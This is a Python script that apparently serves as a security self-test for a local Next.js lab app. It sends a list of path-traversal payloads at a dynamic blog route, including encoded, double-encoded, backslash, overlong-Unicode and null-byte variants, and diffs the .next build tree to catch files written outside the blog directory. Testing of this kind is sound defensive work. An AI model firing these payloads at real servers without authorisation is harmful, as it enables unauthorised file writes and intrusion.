#!/usr/bin/env python3
"""
Active probe: a dynamic app-router slug becomes a filename under
.next/server/app/blog/.  CVE-2026-75604 was exactly this primitive, escaping
via a backslash on Windows.  Snapshot the whole .next tree, fire a battery of
traversal encodings at the route, and diff -- anything created outside
.next/server/app/blog/ is an escape.
"""
import os
import subprocess
import sys
import urllib.parse

BASE = "http://127.0.0.1:3000"
NEXT = "/home/user/nextlab/.next"
CONFINE = os.path.realpath(os.path.join(NEXT, "server/app/blog"))

PAYLOADS = [
    # plain
    "../pwned", "../../pwned", "../../../pwned",
    # percent-encoded slash
    "..%2fpwned", "..%2F..%2Fpwned", "%2e%2e%2fpwned", "%2e%2e/%2e%2e/pwned",
    # double-encoded
    "..%252fpwned", "%252e%252e%252fpwned",
    # backslash (the CVE-2026-75604 char) raw and encoded
    "..\\pwned", "..%5cpwned", "..%5C..%5Cpwned", "%2e%2e%5cpwned",
    "..%255cpwned", "%255c..%255cpwned",
    # mixed separators
    "..%2f..%5cpwned", "..\\../pwned",
    # dot-segment tricks
    "....//pwned", "....\\\\pwned", ".%2e/pwned", "..%00/pwned",
    "..;/pwned", "..%3b/pwned",
    # unicode / overlong
    "..%c0%afpwned", "..%e0%80%afpwned", "..%uff0fpwned",
    # trailing / drive-ish (win32 semantics)
    "..%5c..%5c..%5cpwned", "C:pwned", "%5c%5c?%5cC:%5cpwned",
    # newline / null in name
    "pw%00ned", "pw%0aned",
]


def snapshot():
    out = set()
    for root, _dirs, files in os.walk(NEXT):
        for f in files:
            out.add(os.path.realpath(os.path.join(root, f)))
    return out


def main():
    before = snapshot()
    results = []
    for p in PAYLOADS:
        url = f"{BASE}/blog/{p}"
        try:
            r = subprocess.run(
                ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                 "--path-as-is", url],
                capture_output=True, text=True, timeout=20)
            code = r.stdout.strip()
        except subprocess.TimeoutExpired:
            code = "timeout"
        results.append((p, code))
    after = snapshot()

    new = sorted(after - before)
    escaped = [f for f in new if not f.startswith(CONFINE + os.sep)]

    print("payload -> HTTP status")
    for p, c in results:
        print(f"  {p:32s} {c}")

    print(f"\nnew files under {NEXT}: {len(new)}")
    for f in new:
        mark = "  ESCAPED>" if f in escaped else "         "
        print(f"{mark} {os.path.relpath(f, NEXT)}")

    print("\nfiles written OUTSIDE .next/server/app/blog/:", len(escaped))
    for f in escaped:
        print("   ", f)
    return 1 if escaped else 0


if __name__ == "__main__":
    sys.exit(main())
